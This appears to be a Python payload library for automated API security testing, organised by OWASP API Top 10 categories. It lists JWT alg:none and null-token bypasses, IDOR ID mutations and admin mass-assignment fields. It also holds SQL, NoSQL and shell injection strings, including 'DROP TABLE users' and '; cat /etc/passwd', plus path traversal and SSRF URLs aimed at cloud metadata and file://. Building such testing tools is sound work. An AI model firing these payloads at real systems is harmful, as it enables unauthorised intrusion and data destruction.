"""
Attack payloads for Postman-collection-driven API security testing.

Categories map to the OWASP API Security Top 10 (2023):
- API1:2023 Broken Object Level Authorization  -> BOLA_ID_MUTATIONS
- API2:2023 Broken Authentication               -> AUTH_BYPASS_PAYLOADS
- API3:2023 Broken Object Property Level Authz  -> MASS_ASSIGNMENT_FIELDS
- API7:2023 Server-Side Request Forgery         -> SSRF_PAYLOADS
- Injection (SQLi/NoSQLi/CMDi/XSS/path)         -> INJECTION_PAYLOADS

IMPORTANT: For authorized red-team use only. Do NOT use against systems
without explicit written authorization.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# API2:2023 Broken Authentication — auth-bypass header/token mutations
# ---------------------------------------------------------------------------
AUTH_BYPASS_PAYLOADS: list[dict] = [
    {
        "id": "PM-ATK-AB-001",
        "mutation": "strip_auth",
        "severity": "high",
        "description": "Remove Authorization header entirely",
    },
    {
        "id": "PM-ATK-AB-002",
        "mutation": "override",
        "headers": {"Authorization": "Bearer null"},
        "severity": "critical",
        "description": "Null bearer token",
    },
    {
        "id": "PM-ATK-AB-003",
        "mutation": "override",
        "headers": {"Authorization": "Bearer "},
        "severity": "critical",
        "description": "Empty bearer token",
    },
    {
        "id": "PM-ATK-AB-004",
        "mutation": "override",
        "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."},
        "severity": "critical",
        "description": "JWT with alg:none (signature bypass)",
    },
    {
        "id": "PM-ATK-AB-005",
        "mutation": "override",
        "headers": {"Authorization": "Bearer offensive-ai-invalid-probe-token"},
        "severity": "high",
        "description": "Arbitrary invalid bearer token",
    },
]

# ---------------------------------------------------------------------------
# API1:2023 Broken Object Level Authorization — ID mutation strategies (BOLA/IDOR)
# ---------------------------------------------------------------------------
BOLA_ID_MUTATIONS: list[dict] = [
    {"id": "PM-ATK-BOLA-001", "strategy": "increment", "severity": "high",
     "description": "Increment numeric ID by 1 (sequential IDOR)"},
    {"id": "PM-ATK-BOLA-002", "strategy": "decrement", "severity": "high",
     "description": "Decrement numeric ID by 1 (sequential IDOR)"},
    {"id": "PM-ATK-BOLA-003", "strategy": "one", "severity": "medium",
     "description": "Replace ID with 1 (common first-record id)"},
]

# ---------------------------------------------------------------------------
# API3:2023 Broken Object Property Level Authorization — Mass assignment
# ---------------------------------------------------------------------------
MASS_ASSIGNMENT_FIELDS: list[dict] = [
    {"id": "PM-ATK-MA-001", "field": "role", "value": "admin", "severity": "critical",
     "description": "Inject role=admin into request body"},
    {"id": "PM-ATK-MA-002", "field": "isAdmin", "value": True, "severity": "critical",
     "description": "Inject isAdmin=true into request body"},
    {"id": "PM-ATK-MA-003", "field": "is_admin", "value": True, "severity": "critical",
     "description": "Inject is_admin=true into request body"},
    {"id": "PM-ATK-MA-004", "field": "permissions", "value": ["*"], "severity": "high",
     "description": "Inject permissions=['*'] into request body"},
    {"id": "PM-ATK-MA-005", "field": "price", "value": 0, "severity": "high",
     "description": "Inject price=0 into request body (business-logic tampering)"},
]

# ---------------------------------------------------------------------------
# Injection probes (SQLi / NoSQLi / command / path traversal / XSS)
# ---------------------------------------------------------------------------
INJECTION_PAYLOADS: list[dict] = [
    {"id": "PM-ATK-INJ-001", "payload": "' OR '1'='1", "category": "sqli", "severity": "critical",
     "detect_in_response": ["sql syntax", "sqlstate", "odbc", "ora-", "postgresql", "you have an error in your sql"],
     "description": "Classic SQL injection tautology"},
    {"id": "PM-ATK-INJ-002", "payload": "'; DROP TABLE users;--", "category": "sqli", "severity": "critical",
     "detect_in_response": ["sql syntax", "sqlstate", "syntax error"],
     "description": "Destructive SQL injection probe"},
    {"id": "PM-ATK-INJ-003", "payload": '{"$ne": null}', "category": "nosqli", "severity": "high",
     "detect_in_response": ["bsonobj", "mongoerror", "cast to objectid"],
     "description": "MongoDB operator injection ($ne)"},
    {"id": "PM-ATK-INJ-004", "payload": "; cat /etc/passwd", "category": "cmdi", "severity": "critical",
     "detect_in_response": ["root:x:0:0", "/bin/bash", "/bin/sh"],
     "description": "OS command injection via shell metacharacter"},
    {"id": "PM-ATK-INJ-005", "payload": "../../../../etc/passwd", "category": "path_traversal", "severity": "high",
     "detect_in_response": ["root:x:0:0"],
     "description": "Path traversal probe"},
    {"id": "PM-ATK-INJ-006", "payload": "<script>alert(1)</script>", "category": "xss", "severity": "medium",
     "detect_in_response": ["<script>alert(1)</script>"],
     "description": "Reflected XSS probe"},
]

# ---------------------------------------------------------------------------
# API7:2023 SSRF — payloads for URL-looking body/query fields
# ---------------------------------------------------------------------------
SSRF_PAYLOADS: list[dict] = [
    {"id": "PM-ATK-SSRF-001", "url": "http://169.254.169.254/latest/meta-data/", "severity": "critical",
     "detect_in_response": ["ami-id", "instance-id", "iam/"],
     "description": "Cloud metadata endpoint SSRF"},
    {"id": "PM-ATK-SSRF-002", "url": "http://127.0.0.1:6379/", "severity": "high",
     "detect_in_response": ["redis"],
     "description": "Localhost Redis SSRF probe"},
    {"id": "PM-ATK-SSRF-003", "url": "file:///etc/passwd", "severity": "critical",
     "detect_in_response": ["root:x:0:0"],
     "description": "file:// scheme SSRF probe"},
]

# Field names likely to hold a URL value, used to identify SSRF-testable fields
SSRF_CANDIDATE_FIELD_NAMES: list[str] = [
    "url", "webhook", "callback", "redirect", "next", "return_url", "returnurl",
    "target", "endpoint", "image_url", "avatar_url", "link", "feed", "uri",
]
